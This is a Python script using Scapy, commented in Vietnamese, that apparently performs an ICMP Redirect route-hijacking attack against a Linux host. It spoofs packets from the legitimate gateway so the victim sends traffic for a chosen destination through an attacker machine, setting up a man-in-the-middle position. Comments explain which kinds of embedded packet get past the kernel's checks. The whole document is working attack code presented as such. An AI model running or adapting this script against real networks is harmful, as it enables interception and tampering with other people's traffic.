#!/usr/bin/env python3
# icmp_redirect.py - Tan cong ICMP Redirect (Chinh xac 100% tren Linux Kernel)
import sys
import time
from scapy.all import *

victim_ip   = "10.0.0.2"
gateway_ip  = "10.0.0.1"   # Gateway hop phap bi gia mao
attacker_ip = "10.0.0.66"  # Gateway moi bi ep buoc (Attacker)
target_dst  = "10.0.1.5"   # May dich ma victim muon gui toi

print("==================================================================")
print("[*] TAN CONG ICMP REDIRECT ATTACK (ROUTE HIJACKING / MITM)")
print("==================================================================")
print(f"[*] Muc tieu nan nhan (Victim):        {victim_ip}")
print(f"[*] Gateway hop phap bi gia mao:      {gateway_ip}")
print(f"[*] Gateway moi bi ep buoc (Attacker): {attacker_ip}")
print(f"[*] Dich den bi be lai huong di:      {target_dst}")
print("==================================================================")

# 1. Ban 1 goi ping tu Attacker sang Victim de nap MAC cua Attacker vao bang ARP cua Victim
# (Kernel Linux bat buoc dia chi Gateway moi phai hop le trong ARP - NUD_VALID)
print("[*] 1. Nap MAC cua Attacker vao bang ARP cua Victim...")
send(IP(src=attacker_ip, dst=victim_ip)/ICMP(), count=1, verbose=0)
time.sleep(0.2)

# 2. Tao goi ICMP Redirect:
# BI QUYET KERNEL LINUX: Trong ham icmp_err() cua net/ipv4/icmp.c:
# - Neu goi con co type=8 (Echo Request), kernel se chuyen cho ping_err() va DROP neu khong co socket!
# - Neu goi con co type=0 (Echo Reply) hoac UDP, kernel goi thang ipv4_redirect() de cap nhat route!
orig_icmp = IP(src=victim_ip, dst=target_dst)/ICMP(type=0)
redir_icmp = IP(src=gateway_ip, dst=victim_ip)/ICMP(type=5, code=1, gw=attacker_ip)/orig_icmp

orig_udp  = IP(src=victim_ip, dst=target_dst)/UDP(sport=50000, dport=80)
redir_udp = IP(src=gateway_ip, dst=victim_ip)/ICMP(type=5, code=1, gw=attacker_ip)/orig_udp

print("[*] 2. Dang phat goi ICMP Redirect gia mao toi Victim...")
send(redir_icmp, count=3, verbose=0)
send(redir_udp,  count=3, verbose=0)

print("[+] DA GUI THANH CONG!")
print(f"    -> Hay kiem tra ngay tren Victim: 'ip route get {target_dst}'")
print(f"    -> Duong di da bi be lai qua Gateway moi: {attacker_ip}!")
